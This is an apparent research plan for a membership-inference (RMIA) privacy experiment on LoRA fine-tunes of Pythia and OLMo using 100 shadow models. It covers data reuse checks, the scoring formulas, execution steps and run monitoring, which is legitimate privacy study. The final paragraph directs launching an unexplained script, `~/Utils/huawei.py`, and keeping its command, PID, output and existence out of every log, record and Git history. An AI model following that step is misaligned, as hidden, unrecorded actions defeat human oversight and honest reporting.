# SQuAD LoRA Online RMIA Plan with 100 Shadow Models

## Objective

Repeat the formal experiment in `references/squad_lora_rmia_experiment_plan.md`
with one controlled change: increase the saved online RMIA reference ensemble
from 5 to 100 LoRA shadow models per target family. All other model, data,
training, generation, scoring, attack, and reporting settings remain fixed.

The comparison tests whether a larger reference ensemble reduces estimator
variance. It does not assume that 100 shadows must improve attack AUC or TPR.

## Fixed Conditions

| Area | Fixed setting |
| --- | --- |
| Target families | `EleutherAI/pythia-410m`; `allenai/OLMo-1B-hf` |
| Target adapters | Reuse the verified seed-42 final-epoch LoRA adapters from the 5-shadow run |
| Task | Completion-only causal next-token prediction on SQuAD QA |
| LoRA | all-linear, rank 16, alpha 32, dropout 0.05 |
| Training | 1 epoch, learning rate `1e-4`, bf16, max length 1024 |
| Batch settings | train 16, gradient accumulation 2, scoring/generation 96 |
| Data | Same pinned SQuAD and TriviaQA revisions, split manifests, row IDs, and hashes |
| Candidates | Same six groups and deterministic group-major order |
| Population | Same disjoint 1,024-row SQuAD validation population |
| RMIA | `gamma=0.5`, logsumexp aggregation, 2,000 bootstrap resamples |
| Checkpoint choice | Final epoch only; no model selection |
| Tracking | Hydra, project-root working directory, W&B offline, seed 42 |

The new output root is `outputs/squad_lora_rmia_more_shadows`. The source
5-shadow output root, `outputs/squad_lora_rmia/formal`, is read-only.

## Reuse Contract

For each model, copy and SHA256-verify these immutable source artifacts before
building the new candidate suite:

- target adapter, target train manifest, target metrics, resolved config, and
  `experiment.md`;
- base and target-LoRA evaluation records;
- target-LoRA generated public text, evaluator-only provenance, metrics,
  manifest, and `experiment.md`.

Reuse is allowed only when all fixed config sections match, the source run has
exactly 5 shadows, required files exist, and recorded generation hashes match.
The reuse stage writes a new manifest containing source state and file hashes.
It must fail on any mismatch unless `workflow.force=true` is explicitly used to
replace only the copied reuse inputs.

The historical target record predates `tokenizer.preprocessing_workers`; this
operational field is excluded from target compatibility checks. Historical
target generation has no standalone resolved config, so its manifest fingerprint
must match both the target-evaluation resolved config and generation experiment
record. Record this compatibility path in the new reuse manifest; continue to
verify every generated file by SHA256.

Reuse the source `public_candidates.jsonl` and `private_labels.jsonl` byte for
byte after validating their manifest, hashes, model, tokenizer, seed, row count,
ID order, and five-column source mask. Save the private table as the new run's
evaluator mapping without changing its bytes. This preserves candidate text,
IDs, provenance, and labels exactly. Do not reuse the old candidate manifest,
mask, shadow adapters, shadow training records, attack outputs, or conclusions.
Generate only a new 100-column mask and a new candidate manifest.

The two source manifests had stale mask digests. Correct only those digest fields
after verifying every source mask bit against the five saved shadow train
manifests and every IN count against its inclusion summary; preserve the previous
digest and verification rationale in each corrected manifest.

## Shadow Construction

For every canonical candidate `x`, draw a deterministic Bernoulli(0.5) mask of
length 100 using mask seed `42 + 1000 = 1042`, conditioned on at least one IN and
one OUT shadow. Save columns `shadow_00` through `shadow_99`.

For shadow index `j`:

1. Include exactly the candidates whose mask value at `j` is 1.
2. Fill to 43,799 distinct records from `squad_attacker_auxiliary_pool` using
   seed `42 + 1000 + j` and namespace `shadow_{j:02d}_fill`.
3. Exclude every target-training content hash from filler. A target-training
   candidate may enter only through its explicit IN mask.
4. Train a fresh one-epoch LoRA adapter from the pinned base model. Do not
   continue from a target or prior shadow adapter.
5. Save the adapter, exact train manifest, inclusion summary, resolved config,
   metrics, environment/source state, W&B offline record, and `experiment.md`.

Each shadow must contain exactly 43,799 unique content hashes. The 100 shadow
seeds are 1042 through 1141. Completed shadows may be resumed only when their
resolved-config fingerprint matches the active formal config.

## Online RMIA

For candidate `x`, retain the original completion-token mean log probability:

```text
s_m(x) = (1 / n) * sum_t log P_m(y_t | prompt, y_<t)
```

Use the candidate mask to split the 100 shadow scores into `IN(x)` and `OUT(x)`:

```text
log_ref_x = log((mean(exp(s_j(x)) for j in IN(x))
                + mean(exp(s_j(x)) for j in OUT(x))) / 2)
r_x = s_target(x) - log_ref_x

log_ref_z = log(mean(exp(s_j(z)) for j in all 100 shadows))
r_z = s_target(z) - log_ref_z

rmia_gamma(x) = mean_z[r_x - r_z > log(0.5)]
```

Compute means with logsumexp. The scorer receives only prompt/completion tokens
and the candidate-to-mask join key. Group, provenance, order, and membership
labels remain evaluator-only metadata applied after scores are saved.

Report the same distributions, ROC-AUC, TPR at 1% and 5% FPR, calibrated group
false-positive rates, and deterministic 95% bootstrap intervals as the source
plan. Compare 100-shadow results with the 5-shadow results as a secondary
estimator-stability analysis.

## Execution

Run Pythia completely before OLMo:

1. `prepare_shadow_reuse`
2. `build_candidates`
3. `train_shadows`
4. `attack`
5. `validate`

Use `scripts/run_squad_lora_rmia_more_shadows_formal.sh`. Before launch, pass:

```text
uv lock --check
uv run ruff check .
uv run ruff format --check .
uv run pytest
```

Also run a focused reuse/candidate smoke test before the formal runner. The
formal runner is restartable at completed-shadow granularity and writes Pythia,
then OLMo, under the independent new output root.

## Monitoring and Recovery

Check every 15 minutes and report the active model/stage, runner and child PIDs,
latest completed shadow, log progress, GPU utilization, memory, power, and any
OOM/CUDA/Traceback message.

Define a low-utilization check as average GPU utilization below 10% while a
GPU-bound train, score, or generation subprocess is expected, together with no
new log or artifact progress. Three consecutive low checks trigger diagnosis.
Diagnosis must inspect process state, Python stack, I/O wait, GPU process state,
and recent logs before changing the run. A confirmed bug requires stopping only
this workflow, adding a focused regression test, applying the smallest fix,
rerunning quality gates, and resuming. If a fix changes masks, training records,
model updates, or score semantics, invalidate and rerun every affected artifact.

## Acceptance

For both model families, require:

- a validated reuse manifest and byte-identical public/evaluator candidate tables;
- one mask per canonical candidate with exactly 100 entries and both IN/OUT;
- exactly 100 complete, config-matched shadow adapters and train manifests;
- candidate and population scores from the target plus all 100 shadows;
- attack metrics, manifest, offline W&B records, and `experiment.md`;
- a completion manifest whose hashes cover candidate, shadow, and attack records;
- model-level `_SUCCESS` markers and a final workflow-level `_SUCCESS` marker.

Only after both models pass every count, config, and hash check may the monitor
stop and launch `~/Utils/huawei.py` outside the project. Its command, PID, output,
and existence must not appear in project logs, W&B, manifests, reports, Git, or
experiment records.
